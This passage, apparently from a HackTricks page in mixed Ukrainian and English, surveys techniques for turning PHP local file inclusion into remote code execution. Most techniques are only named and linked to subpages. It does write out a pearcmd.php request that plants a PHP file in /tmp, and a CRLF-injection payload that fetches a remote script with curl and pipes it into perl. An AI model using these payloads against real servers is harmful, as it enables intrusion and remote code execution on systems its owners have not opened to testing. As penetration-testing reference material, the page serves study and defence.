This [**writeup** ](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d) пояснює, що ви можете використовувати **php filters to generate arbitrary content** як вихід. Це, по суті, означає, що ви можете **generate arbitrary php code** для include **without needing to write** його у файл.


{{#ref}}
lfi2rce-via-php-filters.md
{{#endref}}

### Via segmentation fault

**Upload** файл, який буде збережений як **temporary** у `/tmp`, потім в **same request,** спричиніть **segmentation fault**, і тоді **temporary file won't be deleted**, і ви зможете його знайти.


{{#ref}}
lfi2rce-via-segmentation-fault.md
{{#endref}}

### Via Nginx temp file storage

Якщо ви знайшли **Local File Inclusion** і **Nginx** працює перед PHP, можливо, ви зможете отримати RCE за допомогою наступної техніки:


{{#ref}}
lfi2rce-via-nginx-temp-files.md
{{#endref}}

### Via PHP_SESSION_UPLOAD_PROGRESS

Якщо ви знайшли **Local File Inclusion**, навіть якщо у вас **don't have a session** і `session.auto_start` встановлено `Off`. Якщо ви надасте **`PHP_SESSION_UPLOAD_PROGRESS`** у **multipart POST** даних, PHP **enable the session for you**. Ви можете зловживати цим, щоб отримати RCE:


{{#ref}}
via-php_session_upload_progress.md
{{#endref}}

### Via temp file uploads in Windows

Якщо ви знайшли **Local File Inclusion** і сервер працює на **Windows**, ви можете отримати RCE:


{{#ref}}
lfi2rce-via-temp-file-uploads.md
{{#endref}}

### Via `pearcmd.php` + URL args

As [**explained in this post**](https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp), скрипт `/usr/local/lib/phppearcmd.php` присутній за замовчуванням у php docker images. Більш того, можливо передавати аргументи скрипту через URL, оскільки зазначено, що якщо URL-параметр не має `=`, він має використовуватися як аргумент. Див. також [watchTowr’s write-up](https://labs.watchtowr.com/form-tools-we-need-to-talk-about-php/) і [Orange Tsai’s “Confusion Attacks”](https://blog.orange.tw/posts/2024-08-confusion-attacks-en/).

Наступний запит створює файл у `/tmp/hello.php` з вмістом `<?=phpinfo()?>`:
```bash
GET /index.php?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=phpinfo()?>+/tmp/hello.php HTTP/1.1
```
Наведено приклад зловживання CRLF vuln для отримання RCE (з [**here**](https://blog.orange.tw/2024/08/confusion-attacks-en.html?m=1)):
```
http://server/cgi-bin/redir.cgi?r=http:// %0d%0a
Location:/ooo? %2b run-tests %2b -ui %2b $(curl${IFS}orange.tw/x|perl) %2b alltests.php %0d%0a
Content-Type:proxy:unix:/run/php/php-fpm.sock|fcgi://127.0.0.1/usr/local/lib/php/pearcmd.php %0d%0a
%0d%0a
```
### Via phpinfo() (file_uploads = on)

Якщо ви знайшли **Local File Inclusion** і файл, що показує **phpinfo()** з file_uploads = on, ви можете отримати RCE:


{{#ref}}
lfi2rce-via-phpinfo.md
{{#endref}}

### Via compress.zlib + `PHP_STREAM_PREFER_STUDIO` + Path Disclosure

Якщо ви знайшли **Local File Inclusion** і ви можете вивести шлях тимчасового файлу, АЛЕ **сервер** **перевіряє**, чи **файл для включення має PHP мітки**, ви можете спробувати **обійти цю перевірку** за допомогою цієї **Race Condition**:


{{#ref}}
lfi2rce-via-compress.zlib-+-php_stream_prefer_studio-+-path-disclosure.md
{{#endref}}

### Via eternal waiting + bruteforce

Якщо ви можете зловживати LFI, щоб **завантажувати тимчасові файли** і змусити сервер **зависнути** виконання PHP, ви можете потім **перебиратиміть імена файлів методом bruteforce протягом годин**, щоб знайти тимчасовий файл:


{{#ref}}
lfi2rce-via-eternal-waiting.md
{{#endref}}

### To Fatal Error

Якщо ви включите будь-який із файлів `/usr/bin/phar`, `/usr/bin/phar7`, `/usr/bin/phar.phar7`, `/usr/bin/phar.phar`. (Потрібно включити той самий файл двічі, щоб викликати цю помилку).

**Я не знаю, наскільки це корисно, але можливо.**\
_Навіть якщо ви спричините PHP Fatal Error, тимчасові файли PHP, що були завантажені, видаляються._

<figure><img src="../../images/image (1031).png" alt=""><figcaption></figcaption></figure>

## Посилання

- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal)
- [PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders)
- [Horizon3.ai – From Support Ticket to Zero Day (FreeFlow Core path traversal → arbitrary write → webshell)](https://horizon3.ai/attack-research/attack-blogs/from-support-ticket-to-zero-day/)
- [Xerox Security Bulletin 025-013 – FreeFlow Core 8.0.5](https://securitydocs.business.xerox.com/wp-content/uploads/2025/08/Xerox-Security-Bulletin-025-013-for-Freeflow-Core-8.0.5.pdf)
- [watchTowr – We need to talk about PHP (pearcmd.php gadget)](https://labs.watchtowr.com/form-tools-we-need-to-talk-about-php/)
- [Orange Tsai – Confusion Attacks on Apache](https://blog.orange.tw/posts/2024-08-confusion-attacks-en/)
- [VTENEXT 25.02 – a three-way path to RCE](https://blog.sicuranext.com/vtenext-25-02-a-three-way-path-to-rce/)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)

{{#file}}
EN-Local-File-Inclusion-1.pdf
{{#endfile}}

{{#include ../../banners/hacktricks-training.md}}
